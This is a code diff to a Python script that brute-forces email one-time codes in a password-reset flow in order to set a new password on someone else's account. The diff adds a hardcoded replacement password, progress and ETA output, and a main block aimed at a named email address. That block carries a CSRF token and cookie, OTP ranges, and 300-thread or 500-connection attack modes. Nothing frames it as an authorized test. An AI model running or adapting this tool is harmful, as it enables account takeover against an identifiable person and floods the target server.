@@ -17,6 +17,8 @@ from urllib.parse import quote
 import queue
 import os
 
+PASSWORD = "qwerty_123!A"
+
 
 class UltraFastOTPBrute:
     def __init__(self):
@@ -101,9 +103,11 @@ class UltraFastOTPBrute:
                 except:
                     continue
         
-        # Update global counter
+        # Update global counter and print process progress
         with self.lock:
             self.attempt_count[0] += local_attempts
+            if local_attempts > 0:
+                print(f"🔄 Process {process_id}: Completed {local_attempts} attempts from batch")
         
         return results
 
@@ -218,9 +222,12 @@ def maximum_performance_brute_force(start_range, end_range, email, csrf_token, g
                     
                     # Progress update
                     elapsed = time.time() - start_time
-                    if elapsed > 0:
+                    if elapsed > 0 and brute_forcer.attempt_count[0] > 0:
                         rate = brute_forcer.attempt_count[0] / elapsed
-                        print(f"⚡ {brute_forcer.attempt_count[0]:,} attempts | {rate:.0f}/sec")
+                        total_otps = end_range - start_range + 1
+                        progress = (brute_forcer.attempt_count[0] / total_otps) * 100
+                        eta = (total_otps - brute_forcer.attempt_count[0]) / rate if rate > 0 else 0
+                        print(f"⚡ Progress: {progress:.1f}% | {brute_forcer.attempt_count[0]:,}/{total_otps:,} | {rate:.0f}/sec | ETA: {eta/60:.1f}min")
                         
                 except Exception as e:
                     continue
@@ -276,10 +283,12 @@ async def async_otp_brute_force(start_range, end_range, email, csrf_token, ga_co
                     print(f"🎉 ASYNC SUCCESS: {otp} in {elapsed:.1f}s")
                     return otp
                 
-                if i % 1000 == 0:
+                if i % 500 == 0 and i > 0:
                     elapsed = time.time() - start_time
                     rate = i / elapsed if elapsed > 0 else 0
-                    print(f"⚡ {i:,} attempts | {rate:.0f}/sec")
+                    progress = (i / len(otp_list)) * 100
+                    eta = (len(otp_list) - i) / rate if rate > 0 else 0
+                    print(f"🌪️  Async Progress: {progress:.1f}% | {i:,}/{len(otp_list):,} | {rate:.0f}/sec | ETA: {eta/60:.1f}min")
                     
         except KeyboardInterrupt:
             print("\n⏹️  Interrupted")
@@ -340,7 +349,7 @@ def ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_co
             "step": "5",
             "otp_email": quote(email, safe='@'),
             "otpverify": otp,
-            "new_password": "Aa12345!B",
+            "new_password": PASSWORD,
             "csrfmiddlewaretoken": csrf_token
         }
         
@@ -376,10 +385,11 @@ def ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_co
                     f.cancel()
                 break
             
-            if attempt_count[0] % 1000 == 0:
+            if attempt_count[0] % 500 == 0 and attempt_count[0] > 0:
                 elapsed = time.time() - start_time
                 rate = attempt_count[0] / elapsed if elapsed > 0 else 0
-                print(f"⚡ {attempt_count[0]:,} | {rate:.0f}/sec")
+                progress = (attempt_count[0] / len(otp_list)) * 100 if len(otp_list) > 0 else 0
+                print(f"⚡ Progress: {progress:.1f}% | {attempt_count[0]:,}/{len(otp_list):,} attempts | {rate:.0f} OTPs/sec | {elapsed:.1f}s elapsed")
     
     if found_otp[0]:
         elapsed = time.time() - start_time
@@ -389,22 +399,107 @@ def ultra_threading_brute_force(start_range, end_range, email, csrf_token, ga_co
     return None
 
 
-# USAGE EXAMPLES
+# USAGE EXAMPLES WITH EXECUTION TIME TRACKING
 if __name__ == "__main__":
     email = "ariel.agra.archive@gmail.com"
     csrf_token = "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6"
     ga_cookie = "GA1.1.891817179.1758869982"
+
+    START_RANGE = 635000
+    END_RANGE = 640000
+
+    print("🚀 MAXIMUM PERFORMANCE OTP Brute Force Testing")
+    print("=" * 60)
+    print("📧 Target:", email)
+    print("START RANGE:", START_RANGE)
+    print("END RANGE:", END_RANGE)
+    # print("🎯 Available approaches:")
+    # print("1. Ultra-threading (200+ threads)")
+    # print("2. Multiprocessing + Threading hybrid")
+    # print("3. Async extreme concurrency (1000+ connections)")
+    # print("4. Intelligent auto-scaling")
+    print("=" * 60)
     
-    print("Choose your approach:")
-    print("1. Ultra-threading (200+ threads)")
-    print("2. Multiprocessing + Threading hybrid")
-    print("3. Async extreme concurrency (1000+ connections)")
-    print("4. Intelligent auto-scaling")
+    # Test different approaches with execution time tracking
     
-    # Example: Ultra-threading with 300 threads
+    # # Example 1: Ultra-threading with detailed timing
+    print("\n🧵 Testing Ultra-Threading Approach (300 threads)")
+    print("-" * 50)
+    overall_start = time.time()
+
     result = ultra_threading_brute_force(
-        290000, 295000, email, csrf_token, ga_cookie, max_threads=300
+        start_range=START_RANGE,
+        end_range=END_RANGE,  # Test 2000 OTPs for demo
+        email=email,
+        csrf_token=csrf_token,
+        ga_cookie=ga_cookie,
+        max_threads=300
     )
+
+    overall_elapsed = time.time() - overall_start
+    print(f"\n📊 ULTRA-THREADING RESULTS:")
+    print(f"⏱️  Total Execution Time: {overall_elapsed:.2f} seconds ({overall_elapsed/60:.2f} minutes)")
+    print(f"🎯 Result: {'✅ SUCCESS - ' + result if result else '❌ No OTP found'}")
+    print(f"🚀 Overall Performance: {(END_RANGE - START_RANGE)/overall_elapsed:.1f} OTPs/second")
+    #
+    # # Example 2: Multiprocessing approach
+    # print("\n🔀 Testing Multiprocessing + Threading Hybrid")
+    # print("-" * 50)
+    # hybrid_start = time.time()
+    #
+    # result2 = maximum_performance_brute_force(
+    #     start_range=435000,
+    #     end_range=441000,  # Test another 2000 OTPs
+    #     email=email,
+    #     csrf_token=csrf_token,
+    #     ga_cookie=ga_cookie,
+    #     max_processes=4,
+    #     threads_per_process=50
+    # )
+    #
+    # hybrid_elapsed = time.time() - hybrid_start
+    # print(f"\n📊 HYBRID MULTIPROCESSING RESULTS:")
+    # print(f"⏱️  Total Execution Time: {hybrid_elapsed:.2f} seconds ({hybrid_elapsed/60:.2f} minutes)")
+    # print(f"🎯 Result: {'✅ SUCCESS - ' + result2 if result2 else '❌ No OTP found'}")
+    # print(f"🚀 Overall Performance: {2000/hybrid_elapsed:.1f} OTPs/second")
+    #
+    # # Example 3: Async approach (commented out to avoid overwhelming)
+    # print("\n🌪️  Async Extreme Concurrency (Ready to test)")
+    # print("-" * 50)
+    # print("⚠️  Async mode ready but commented out to prevent server overload")
+    # print("💡 Uncomment the code below to test 1000+ concurrent connections")
     
-    if result:
-        print(f"Found: {result}")
+    # Uncomment for async testing (WARNING: Very high server load!)
+    # async_start = time.time()
+    # result3 = asyncio.run(async_otp_brute_force(
+    #     start_range=104001,
+    #     end_range=105000,
+    #     email=email,
+    #     csrf_token=csrf_token,
+    #     ga_cookie=ga_cookie,
+    #     max_concurrent=500  # Start with 500, can go up to 1000+
+    # ))
+    # async_elapsed = time.time() - async_start
+    # print(f"\n📊 ASYNC RESULTS:")
+    # print(f"⏱️  Total Execution Time: {async_elapsed:.2f} seconds")
+    # print(f"🎯 Result: {'✅ SUCCESS - ' + result3 if result3 else '❌ No OTP found'}")
+    
+    # Summary
+    # total_program_time = time.time() - overall_start
+    # print(f"\n" + "=" * 60)
+    # print(f"📈 PERFORMANCE SUMMARY")
+    # print(f"⏱️  Total Program Runtime: {total_program_time:.2f} seconds ({total_program_time/60:.2f} minutes)")
+    # print(f"🧵 Ultra-threading: {overall_elapsed:.2f}s ({2000/overall_elapsed:.1f} OTPs/sec)")
+    # print(f"🔀 Hybrid approach: {hybrid_elapsed:.2f}s ({2000/hybrid_elapsed:.1f} OTPs/sec)")
+    #
+    # if result or result2:
+    #     print(f"\n🎉 SUCCESS! Found OTP(s):")
+    #     if result:
+    #         print(f"   ✅ Ultra-threading found: {result}")
+    #     if result2:
+    #         print(f"   ✅ Hybrid approach found: {result2}")
+    # else:
+    #     print(f"\n❌ No valid OTPs found in tested ranges")
+    #     print(f"💡 Try expanding the search range or checking credentials")
+    #
+    # print(f"\n🔚 Program completed at {time.strftime('%Y-%m-%d %H:%M:%S')}")
